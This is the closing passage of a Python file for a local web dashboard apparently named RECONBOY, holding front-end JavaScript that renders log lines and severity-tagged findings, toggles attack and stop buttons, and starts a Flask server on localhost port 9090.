    `<div class="l-${l.type}"><span class="ts">${l.ts}</span>${escapeHtml(l.text)}</div>`
  ).join('');
  logEl.scrollTop = logEl.scrollHeight;

  const fEl = document.getElementById('findings');
  if (s.findings.length === 0) {
    fEl.innerHTML = '<div class="empty">No findings yet</div>';
  } else {
    fEl.innerHTML = s.findings.map(f =>
      `<div class="finding ${f.severity}"><span class="sev">[${f.severity}]</span>${escapeHtml(f.name)} — ${escapeHtml(f.detail)}</div>`
    ).join('');
  }

  if (!s.running) {
    document.getElementById('attackBtn').style.display = 'inline-block';
    document.getElementById('stopBtn').style.display = 'none';
    if (polling) { clearInterval(polling); polling = null; }
  }
}

function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}
</script>
</body>
</html>
"""

if __name__ == '__main__':
    print("\n  RECONBOY starting...")
    print("  Open: http://127.0.0.1:9090\n")
    app.run(host='127.0.0.1', port=9090, debug=False)
